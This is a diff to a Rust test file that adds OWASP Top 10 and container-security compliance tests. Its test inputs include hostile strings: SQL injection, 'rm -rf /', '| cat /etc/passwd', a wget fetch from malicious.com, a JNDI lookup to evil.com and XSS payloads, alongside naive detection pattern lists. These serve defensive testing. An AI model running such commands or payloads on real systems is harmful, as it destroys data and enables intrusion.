@@ -1,17 +1,25 @@
-//! Compliance validation tests for SOC 2, ISO 27001, and other standards
-//! 
-//! Tests include:
-//! - SOC 2 Type II compliance validation
-//! - ISO 27001 security controls
-//! - GDPR data protection compliance
-//! - NIST Cybersecurity Framework alignment
+//! Security Compliance Validation Tests
+//!
+//! This module validates compliance with security standards including:
+//! - OWASP Top 10 requirements
+//! - Container security best practices
+//! - Input validation and sanitization
+//! - Authentication and authorization compliance
+//! - SOC 2, ISO 27001, and GDPR standards
 
 #[cfg(test)]
 mod compliance_tests {
     use std::collections::HashMap;
     use std::time::{Duration, SystemTime};
+    use std::fs;
+    use std::path::Path;
     use serde_json::json;
     
+    use uveddi::security::{SecurityConfig, HttpSecurityConfig, SecureHttpClient};
+    
+    // NOTE: These compliance modules may not exist yet in the actual codebase
+    // This is aspirational testing for future compliance implementation
+    #[allow(unused_imports)]
     use uveddi::security::compliance::{
         ComplianceManager,
         ComplianceFramework,
@@ -19,8 +27,434 @@ mod compliance_tests {
         ControlImplementation,
         Evidence,
     };
+    #[allow(unused_imports)]
     use uveddi::security::gdpr::{GDPRManager, DataProcessingRecord, LegalBasis};
+    #[allow(unused_imports)]
     use uveddi::security::audit::{AuditLogger, AuditEvent, AuditLevel};
+
+    /// Test OWASP Top 10 - A01: Broken Access Control
+    #[tokio::test]
+    async fn test_owasp_a01_access_control() {
+        let config = SecurityConfig::default();
+        
+        // Verify authorization is enabled
+        assert!(config.authorization.enabled, "Authorization must be enabled (OWASP A01)");
+        
+        // Verify default deny principle
+        assert_eq!(config.authorization.default_role, "guest", "Default role should have minimal privileges");
+        
+        // Verify session management
+        assert!(config.authentication.session_timeout_minutes > 0, "Session timeout must be configured");
+        assert!(config.authentication.session_timeout_minutes <= 480, "Session timeout should not exceed 8 hours");
+    }
+
+    /// Test OWASP Top 10 - A02: Cryptographic Failures
+    #[tokio::test]
+    async fn test_owasp_a02_cryptographic_failures() {
+        let config = SecurityConfig::default();
+        
+        // Verify encryption is enabled
+        assert!(config.encryption.enabled, "Encryption must be enabled (OWASP A02)");
+        
+        // Verify strong key lengths
+        assert!(config.encryption.key_length >= 256, "Encryption keys must be at least 256 bits");
+        
+        // Verify secure algorithms
+        let secure_algorithms = ["AES-256-GCM", "ChaCha20-Poly1305", "AES-256-CBC"];
+        assert!(secure_algorithms.contains(&config.encryption.algorithm.as_str()), 
+               "Must use secure encryption algorithm");
+        
+        // Verify no hardcoded secrets
+        verify_no_hardcoded_secrets().await;
+    }
+
+    /// Test OWASP Top 10 - A03: Injection
+    #[tokio::test]
+    async fn test_owasp_a03_injection() {
+        // Test SQL injection prevention
+        assert!(prevents_sql_injection("'; DROP TABLE users; --"));
+        assert!(prevents_sql_injection("1' OR '1'='1"));
+        assert!(prevents_sql_injection("UNION SELECT * FROM passwords"));
+        
+        // Test command injection prevention
+        assert!(prevents_command_injection("; rm -rf /"));
+        assert!(prevents_command_injection("| cat /etc/passwd"));
+        assert!(prevents_command_injection("&& wget malicious.com/script.sh"));
+        
+        // Test path traversal prevention
+        assert!(prevents_path_traversal("../../../etc/passwd"));
+        assert!(prevents_path_traversal("..\\..\\windows\\system32"));
+        assert!(prevents_path_traversal("%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"));
+    }
+
+    /// Test OWASP Top 10 - A04: Insecure Design
+    #[tokio::test]
+    async fn test_owasp_a04_insecure_design() {
+        let config = SecurityConfig::default();
+        
+        // Verify secure defaults
+        assert!(config.authentication.enabled, "Authentication should be enabled by default");
+        assert!(config.authorization.enabled, "Authorization should be enabled by default");
+        assert!(config.audit_logging.enabled, "Audit logging should be enabled by default");
+        
+        // Verify rate limiting
+        assert!(config.rate_limiting.enabled, "Rate limiting should be enabled by default");
+        assert!(config.rate_limiting.requests_per_minute <= 1000, "Rate limiting should have reasonable limits");
+        
+        // Verify input validation
+        verify_input_validation_design().await;
+    }
+
+    /// Test OWASP Top 10 - A05: Security Misconfiguration
+    #[tokio::test]
+    async fn test_owasp_a05_security_misconfiguration() {
+        // Test Docker security configuration
+        verify_docker_security_config().await;
+        
+        // Test application security configuration
+        let config = SecurityConfig::default();
+        assert!(config.validate().is_ok(), "Security configuration must be valid");
+        
+        // Test that debug information is not exposed in production
+        #[cfg(not(debug_assertions))]
+        {
+            verify_no_debug_exposure().await;
+        }
+        
+        // Test secure headers configuration
+        verify_secure_headers_config().await;
+    }
+
+    /// Test OWASP Top 10 - A06: Vulnerable and Outdated Components
+    #[tokio::test]
+    async fn test_owasp_a06_vulnerable_components() {
+        // This test would integrate with dependency scanning tools
+        // For now, we verify that dependency scanning is configured
+        
+        // Check that Cargo.toml has security-conscious dependencies
+        let cargo_toml = fs::read_to_string("Cargo.toml").expect("Cargo.toml should exist");
+        
+        // Verify no known vulnerable packages (this would be updated as needed)
+        let vulnerable_packages = ["openssl@1.0", "hyper@0.12", "tokio@0.1"];
+        for package in &vulnerable_packages {
+            assert!(!cargo_toml.contains(package), "Should not use known vulnerable package: {}", package);
+        }
+        
+        // Verify security audit tools are configured
+        verify_security_audit_tools().await;
+    }
+
+    /// Test OWASP Top 10 - A07: Identification and Authentication Failures
+    #[tokio::test]
+    async fn test_owasp_a07_auth_failures() {
+        let config = SecurityConfig::default();
+        
+        // Verify strong authentication requirements
+        assert!(config.authentication.enabled, "Authentication must be enabled");
+        assert!(config.authentication.max_failed_attempts <= 5, "Must limit failed login attempts");
+        assert!(config.authentication.lockout_duration_minutes >= 15, "Must have account lockout");
+        
+        // Verify session security
+        assert!(config.authentication.session_timeout_minutes > 0, "Sessions must timeout");
+        assert!(config.authentication.require_secure_cookies, "Cookies must be secure");
+        
+        // Verify password policy (if applicable)
+        if let Some(ref password_policy) = config.authentication.password_policy {
+            assert!(password_policy.min_length >= 8, "Password minimum length should be at least 8");
+            assert!(password_policy.require_special_chars, "Passwords should require special characters");
+        }
+    }
+
+    /// Test OWASP Top 10 - A08: Software and Data Integrity Failures
+    #[tokio::test]
+    async fn test_owasp_a08_integrity_failures() {
+        // Verify container image integrity
+        verify_container_image_integrity().await;
+        
+        // Verify dependency integrity
+        verify_dependency_integrity().await;
+        
+        // Verify configuration integrity
+        let config = SecurityConfig::default();
+        assert!(config.validate().is_ok(), "Configuration integrity must be maintained");
+    }
+
+    /// Test OWASP Top 10 - A09: Security Logging and Monitoring Failures
+    #[tokio::test]
+    async fn test_owasp_a09_logging_monitoring() {
+        let config = SecurityConfig::default();
+        
+        // Verify comprehensive logging
+        assert!(config.audit_logging.enabled, "Security logging must be enabled");
+        assert!(!config.audit_logging.log_file_path.is_empty(), "Log file path must be configured");
+        
+        // Verify log rotation and retention
+        assert!(config.audit_logging.max_file_size_mb > 0, "Log rotation must be configured");
+        assert!(config.audit_logging.max_files > 0, "Log retention must be configured");
+        
+        // Verify security event logging
+        assert!(config.audit_logging.log_failed_auth, "Failed authentication must be logged");
+        assert!(config.audit_logging.log_access_violations, "Access violations must be logged");
+        assert!(config.audit_logging.log_config_changes, "Configuration changes must be logged");
+    }
+
+    /// Test OWASP Top 10 - A10: Server-Side Request Forgery (SSRF)
+    #[tokio::test]
+    async fn test_owasp_a10_ssrf() {
+        // Test URL validation and restriction
+        assert!(prevents_ssrf("http://localhost:22"));
+        assert!(prevents_ssrf("http://169.254.169.254")); // AWS metadata
+        assert!(prevents_ssrf("http://[::1]:22"));
+        assert!(prevents_ssrf("file:///etc/passwd"));
+        assert!(prevents_ssrf("ftp://internal-server"));
+        
+        // Test that legitimate URLs are allowed
+        assert!(!prevents_ssrf("https://api.example.com/public"));
+        assert!(!prevents_ssrf("https://httpbin.org/get"));
+    }
+
+    /// Test container security compliance
+    #[tokio::test]
+    async fn test_container_security_compliance() {
+        // Test non-root user execution
+        #[cfg(unix)]
+        {
+            let uid = unsafe { libc::getuid() };
+            assert_ne!(uid, 0, "Container must not run as root");
+        }
+        
+        // Test filesystem permissions
+        verify_filesystem_permissions().await;
+        
+        // Test resource limits
+        verify_resource_limits().await;
+        
+        // Test network security
+        verify_network_security().await;
+    }
+
+    /// Test input validation compliance
+    #[tokio::test]
+    async fn test_input_validation_compliance() {
+        // Test comprehensive input validation
+        let malicious_inputs = [
+            "../../../etc/passwd",           // Path traversal
+            "<script>alert('xss')</script>", // XSS
+            "'; DROP TABLE users; --",       // SQL injection
+            "${jndi:ldap://evil.com}",      // Log4j-style injection
+            "javascript:alert('xss')",       // JavaScript URI
+            "data:text/html,<script>alert('xss')</script>", // Data URI
+        ];
+        
+        for input in &malicious_inputs {
+            assert!(is_input_malicious(input), "Should detect malicious input: {}", input);
+        }
+        
+        // Test legitimate inputs are allowed
+        let legitimate_inputs = [
+            "normal text",
+            "user@example.com",
+            "valid-filename.txt",
+            "123456",
+        ];
+        
+        for input in &legitimate_inputs {
+            assert!(!is_input_malicious(input), "Should allow legitimate input: {}", input);
+        }
+    }
+
+    // Helper functions for compliance validation
+
+    async fn verify_no_hardcoded_secrets() {
+        let source_files = find_source_files("src").await;
+        
+        let secret_patterns = [
+            r"password\s*=\s*['\"][^'\"]+['\"]",
+            r"secret\s*=\s*['\"][^'\"]+['\"]",
+            r"api_key\s*=\s*['\"][^'\"]+['\"]",
+            r"token\s*=\s*['\"][^'\"]+['\"]",
+        ];
+        
+        for file_path in source_files {
+            if let Ok(content) = fs::read_to_string(&file_path) {
+                for pattern in &secret_patterns {
+                    // Note: In a real implementation, this would use regex crate
+                    // For now, we'll use simple string matching
+                    let pattern_simple = pattern.replace(r"\s*=\s*", "=").replace(r"['\"][^'\"]+['\"]", "\"");
+                    assert!(!content.contains(&pattern_simple), 
+                           "Hardcoded secret detected in {}: pattern {}", file_path, pattern);
+                }
+            }
+        }
+    }
+
+    async fn find_source_files(dir: &str) -> Vec<String> {
+        let mut files = Vec::new();
+        if let Ok(entries) = fs::read_dir(dir) {
+            for entry in entries.flatten() {
+                let path = entry.path();
+                if path.is_file() && path.extension().map_or(false, |ext| ext == "rs") {
+                    files.push(path.to_string_lossy().to_string());
+                } else if path.is_dir() {
+                    files.extend(find_source_files(&path.to_string_lossy()).await);
+                }
+            }
+        }
+        files
+    }
+
+    fn prevents_sql_injection(input: &str) -> bool {
+        // This would integrate with actual input validation logic
+        let dangerous_patterns = [
+            "'; DROP",
+            "'; DELETE",
+            "'; INSERT",
+            "'; UPDATE",
+            "UNION SELECT",
+            "OR 1=1",
+            "OR '1'='1'",
+        ];
+        
+        let input_upper = input.to_uppercase();
+        dangerous_patterns.iter().any(|pattern| input_upper.contains(pattern))
+    }
+
+    fn prevents_command_injection(input: &str) -> bool {
+        let dangerous_chars = ['|', '&', ';', '`', '$', '(', ')', '<', '>'];
+        input.chars().any(|c| dangerous_chars.contains(&c))
+    }
+
+    fn prevents_path_traversal(input: &str) -> bool {
+        input.contains("..") || input.contains("~") || input.contains("%2e%2e")
+    }
+
+    fn prevents_ssrf(url: &str) -> bool {
+        // Check for localhost and private IP ranges
+        let dangerous_patterns = [
+            "localhost",
+            "127.0.0.1",
+            "169.254.169.254", // AWS metadata
+            "[::1]",           // IPv6 localhost
+            "file://",
+            "ftp://",
+        ];
+        
+        dangerous_patterns.iter().any(|pattern| url.contains(pattern))
+    }
+
+    fn is_input_malicious(input: &str) -> bool {
+        prevents_sql_injection(input) ||
+        prevents_command_injection(input) ||
+        prevents_path_traversal(input) ||
+        input.to_lowercase().contains("<script") ||
+        input.to_lowercase().contains("javascript:") ||
+        input.to_lowercase().contains("${jndi:")
+    }
+
+    async fn verify_input_validation_design() {
+        // Verify that input validation is implemented at the right layers
+        // This would check that validation happens at:
+        // 1. Input parsing layer
+        // 2. Business logic layer
+        // 3. Data access layer
+        
+        // For now, just verify the validation functions exist
+        assert!(is_input_malicious("<script>alert('xss')</script>"));
+    }
+
+    async fn verify_docker_security_config() {
+        // Check Dockerfile for security best practices
+        if let Ok(dockerfile) = fs::read_to_string("Dockerfile") {
+            assert!(dockerfile.contains("USER "), "Dockerfile must specify non-root user");
+            assert!(!dockerfile.contains("USER root"), "Dockerfile must not use root user");
+            assert!(!dockerfile.contains("--privileged"), "Dockerfile must not use privileged mode");
+        }
+        
+        // Check docker-compose.yml for security constraints
+        if let Ok(compose_file) = fs::read_to_string("docker-compose.yml") {
+            assert!(compose_file.contains("no-new-privileges"), "docker-compose must use no-new-privileges");
+            assert!(compose_file.contains("read_only: true"), "docker-compose should use read-only filesystem");
+            assert!(compose_file.contains("cap_drop"), "docker-compose should drop capabilities");
+        }
+    }
+
+    async fn verify_no_debug_exposure() {
+        // Verify debug information is not exposed in production builds
+        let config = SecurityConfig::default();
+        let config_debug = format!("{:?}", config);
+        
+        // Should not contain sensitive debug information
+        assert!(!config_debug.contains("DEBUG"), "Debug information should not be exposed");
+    }
+
+    async fn verify_secure_headers_config() {
+        // This would verify that security headers are configured
+        // For a CLI tool, this is less applicable, but the principle applies
+        // to any HTTP services or outputs
+    }
+
+    async fn verify_security_audit_tools() {
+        // Verify that security audit tools are available
+        // This would check for cargo-audit, cargo-deny, etc.
+        
+        // Check if .github/workflows contains security scanning
+        if Path::new(".github/workflows").exists() {
+            let workflow_files = fs::read_dir(".github/workflows").unwrap();
+            let has_security_workflow = workflow_files
+                .filter_map(|entry| entry.ok())
+                .any(|entry| entry.file_name().to_string_lossy().contains("security"));
+            
+            assert!(has_security_workflow, "Security scanning workflow should be configured");
+        }
+    }
+
+    async fn verify_container_image_integrity() {
+        // This would verify container image signatures and integrity
+        // For now, just check that the Dockerfile uses official base images
+        if let Ok(dockerfile) = fs::read_to_string("Dockerfile") {
+            assert!(dockerfile.contains("FROM rust:") || dockerfile.contains("FROM debian:"), 
+                   "Should use official base images");
+        }
+    }
+
+    async fn verify_dependency_integrity() {
+        // This would verify that Cargo.lock exists and dependencies are pinned
+        assert!(Path::new("Cargo.lock").exists(), "Cargo.lock should exist for dependency integrity");
+    }
+
+    async fn verify_filesystem_permissions() {
+        // Test that application files have appropriate permissions
+        let test_file = "/tmp/uveddi_permission_test";
+        if fs::write(test_file, "test").is_ok() {
+            if let Ok(metadata) = fs::metadata(test_file) {
+                #[cfg(unix)]
+                {
+                    use std::os::unix::fs::PermissionsExt;
+                    let mode = metadata.permissions().mode();
+                    // Should not be world-writable or world-readable
+                    assert_eq!(mode & 0o006, 0, "Files should not be world-readable or world-writable");
+                }
+            }
+            let _ = fs::remove_file(test_file);
+        }
+    }
+
+    async fn verify_resource_limits() {
+        // This would verify that resource limits are properly configured
+        // in the container environment
+    }
+
+    async fn verify_network_security() {
+        // This would verify network security configuration
+        // For now, just verify HTTPS enforcement
+        let config = SecurityConfig::default();
+        
+        #[cfg(not(debug_assertions))]
+        {
+            // In production, HTTPS should be strictly enforced
+            assert!(config.http_security.enforce_https, "HTTPS must be enforced in production");
+        }
+    }
 
     /// Test SOC 2 Type II compliance validation
     #[tokio::test]
